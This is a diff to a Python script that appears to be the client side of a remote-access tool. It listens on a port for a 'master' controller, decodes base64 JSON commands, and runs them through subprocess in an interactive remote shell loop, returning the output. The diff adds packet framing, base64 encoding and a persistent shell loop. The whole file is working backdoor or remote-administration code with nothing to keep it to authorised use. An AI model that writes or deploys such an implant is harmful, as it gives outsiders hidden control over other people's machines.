@@ -1,9 +1,12 @@
 # 小可怜
 import json
+import shlex
 import socket
 import subprocess
 import sys
 import threading
+import base64
+import struct
 Master_ip = "127.0.0.1"
 Master_port = 9998
 Passport = 1234
@@ -89,7 +92,39 @@ def listen_master(ip = "0.0.0.0",port = 12345):
         print(f'[*] Accepted connection from {address[0]}:{address[1]}')
         client_thread = threading.Thread(target=handler,args=(master_socket,))
         client_thread.start()
-        
+
+
+def packet_length_recv(thissocket):
+    """_summary_接收报文头获得数据长度
+
+    Args:
+        socket (socket): socket
+
+    Returns:
+        int: data_length
+    """
+    data_header = thissocket.recv(4)
+    data_length = struct.unpack('i',data_header)[0]
+    return data_length
+
+def add_packet_length(msg):
+    """add packet header
+
+    Args:
+        msg (bytes): _description_
+
+    Returns:
+        bytes: _description_
+    """
+    
+    data_length = len(msg)
+    packet_header = struct.pack('i',data_length)
+    return_data = packet_header + msg
+    
+    return return_data
+
+
+
 
 def handler(master_socket):
     """服务端处理
@@ -97,28 +132,33 @@ def handler(master_socket):
     Args:
         master_socket (_type_): socket
     """
-    buffer = ""
+    recv_data = b""
+    recv_size = 0
+    
+    #接收报文头
+    data_length = packet_length_recv(master_socket)
+    
     # 持续接收数据
-    while True:
-        msg = master_socket.recv(1024).decode()
-        print(f"msg = {msg}")
-        if not msg:
-            break
-        else:
-            buffer += msg
-    # buffer = buffer.decode()
-    buffer = buffer.replace('\'','\"')
-    data = json.loads(buffer)
-    
-    print(data)
-    
+    while (recv_size < data_length):
+        buffer = master_socket.recv(1024)
+        recv_size += len(buffer)
+        recv_data += buffer
+
+    recv_data = decode(recv_data).decode()
+    recv_data = recv_data.replace('\'','\"')
+    data = json.loads(recv_data)
+        
     master_code = data[0]
     
     output = Master_choose[master_code](master_socket,data[1:])
     if output:
-        master_socket.send(f"[ * ]Complete master task. Type {master_code} From ip {socket.gethostname}".encode())
+        send_msg = f"[ * ]Complete master task. Type {master_code} From ip {get_host_ip()}".encode()
+        send_msg = add_packet_length(send_msg)
+        master_socket.send(send_msg)
     else:
-        master_socket.send(f"[ !!! ]Failed task!!. Type {master_code} From ip {socket.gethostname}".encode())
+        send_msg = f"[ !!! ]Failed task!!. Type {master_code} From ip {get_host_ip()}".encode()
+        send_msg = add_packet_length(send_msg)
+        master_socket.send(send_msg)
     
     
 
@@ -161,14 +201,16 @@ def run_command(command):
     """
     command = command.rstrip() #删除尾部空格
     #运行命令
+    if not command:
+        return
     try:
-        output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
-
+        output = subprocess.check_output(shlex.split(command),stderr=subprocess.STDOUT)
     except Exception as e:
-        output = "failed to execute command.\r\n"
-        output += e
+        print(type(e))
+        
+        output = f"[ !!! ]failed to execute {command}.\r\n"
         output = output.encode()
-
+ 
     #返回命令结果
     return output
 
@@ -178,19 +220,35 @@ def open_shell(master_socket,msg):
     Args:
         msg (str): _description_
     """
-    print(f"Shell model : type = {msg[0]}")
-    shell_type = msg[0].encode()
     
-    
-    # 给控制端发送 如 xxx# 命令行提示符
-    master_socket.send(shell_type)
-    cmd_buffer = ""
-    
-    while ("\n" not in cmd_buffer):
-        cmd_buffer += master_socket.recv(1024).decode()
+    while True:
+        cmd_buffer = b""
+        recv_size = 0
+        cmd_length = packet_length_recv(master_socket)
+        
+        # 接收数据
+        while (recv_size < cmd_length):
+            temp_data = master_socket.recv(1024)
+            recv_size += len(temp_data)
+            cmd_buffer += temp_data
+            
+        
+        cmd_buffer = decode(cmd_buffer).decode()
+        if(cmd_buffer == "exit"):
+            print(f"[ * ] Exit")
+            break
         response = run_command(cmd_buffer)
+        response = add_packet_length(response)
         master_socket.send(response)
+    return True
+    
 
+def decode(msg):
+    output = None
+    data = msg
+    
+    output = base64.b64decode(data)
+    return output
 
 Master_choose = {
     'upload':upload,
